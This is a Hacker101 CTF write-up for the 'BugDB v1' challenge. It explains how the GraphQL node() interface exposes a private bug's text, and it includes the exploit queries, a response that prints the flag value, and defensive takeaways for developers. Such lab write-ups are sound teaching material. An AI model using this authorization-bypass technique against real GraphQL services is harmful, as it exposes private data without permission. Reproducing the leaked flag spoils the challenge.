# BugDB v1

**Platform:** HackerOne CTF
**Challenge:** BugDB v1
**Difficulty:** Easy
**Category:** Web
**Flags:** 1

---

## Overview

BugDB v1 is a GraphQL-based bug tracking application. It exposes a `/graphql` endpoint with GraphiQL and has two bug types: `Bugs` (public view, no text field) and `Bugs_` (full view, includes text field). The application fails to properly enforce access control at the GraphQL `node()` interface, allowing access to the text of private bugs.

**Hints provided:**
- Flag 0: "Not Found — What can you see? What can you not see?"

**Server:** openresty/1.29.2.4, GraphQL

---

## Reconnaissance

### Application Behavior

The root page only contains a single link to `/graphql`. The application is purely a GraphQL API with a GraphiQL interface.

| Page/Endpoint | Method | Purpose |
|---------------|--------|---------|
| / | GET | Home page — single link to /graphql |
| /graphql | GET | GraphiQL IDE |
| /graphql | POST | GraphQL API endpoint |

### Key Findings

1. **GraphQL introspection is enabled.** The full schema is recoverable via introspection queries.
2. **Two bug types exist:** `Bugs` has fields `{id, reporterId, private, reporter}`. `Bugs_` has fields `{id, reporterId, text, private, reporter}` — note the extra `text` field.
3. **The `node(id:)` query returns `Bugs_` type**, bypassing the `private` flag and exposing the `text` field that the regular `allBugs`/`bug` queries would not include.
4. **Two bugs exist:** Bug 1 (`QnVnczox`) is public. Bug 2 (`QnVnczoy`) is private and reported by user "victim".
5. **Two users exist:** admin and victim.

---

## Flag 0 — GraphQL Node Query Authorization Bypass

**Method:** Access private bug text via GraphQL `node()` interface query

### Vulnerability

The GraphQL schema defines two bug types:

- **`Bugs`** (used by `allBugs`, `bug` queries): `{id, reporterId, private, reporter}` — no `text` field
- **`Bugs_`** (used by `findBug`, and resolved by `node()` interface): `{id, reporterId, text, private, reporter}` — includes `text`

The `node(id:)` query on the Query type resolves to the `Node` interface, which is implemented by `Bugs_`. This means querying `node(id: "QnVnczoy")` returns the `Bugs_` type with access to the `text` field, bypassing the `private` flag that would normally hide the text from regular queries.

### Exploit

1. **Discover bug IDs** via `allBugs` introspection:
```graphql
{ allBugs { edges { node { id private } } } }
```
Returns: `QnVnczox` (public), `QnVnczoy` (private)

2. **Access private bug text** via `node()` query with inline fragment on `Bugs_`:
```graphql
query { node(id: "QnVnczoy") { ... on Bugs_ { text private reporter { username } } } }
```

3. **Response** reveals the flag in `text`:
```json
{
  "data": {
    "node": {
      "id": "QnVnc186Mg==",
      "__typename": "Bugs_",
      "text": "^FLAG^09c317fee0085888f3f73cec6fd020ea03c955b1cc317da6f5d07a853d704032$FLAG$",
      "private": true,
      "reporter": {"username": "victim"}
    }
  }
}
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** GraphQL `node()` interface queries can bypass type-level access controls. When using the Relay-compliant `Node` interface pattern, ensure that authorization checks are applied at the interface resolver level, not just at the field resolver level. The `Bugs_` type including a `text` field that `Bugs` doesn't suggests the developer intended regular queries (`allBugs`) to hide text, but forgot that the `node()` interface exposes the richer `Bugs_` type.

---

## Complete Flag List

| Flag | Hex | Technique |
|:----:|-----|-----------|
| 0 | `<redacted>` | GraphQL node() query bypass |

---

## Key Takeaways

1. **GraphQL interfaces can leak data:** The `Node` interface pattern is convenient but can expose richer type implementations with fields not available through the regular query path.
2. **Type mismatch is a signal:** The existence of both `Bugs` and `Bugs_` types suggests a design flaw — the "internal" type leaks through the `node()` query.
3. **Private fields need defense in depth:** Just because `allBugs` doesn't return `text` doesn't mean there aren't other query paths to access it.
4. **Always test all query entry points:** If `allBugs` and `bug` are restricted, try `node()`, `findBug()`, and any user-accessible relay queries.

---

## Files

| File | Description |
|------|-------------|
| `solve.py` | Complete PoC — discovers bugs via allBugs, accesses text via node() |

## Usage

```bash
pip install requests
python3 solve.py https://<instance-id>.ctf.hacker101.com/
```

---

## References

- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [GraphQL Node Interface (Relay)](https://relay.dev/docs/guides/graphql-server-specification/)
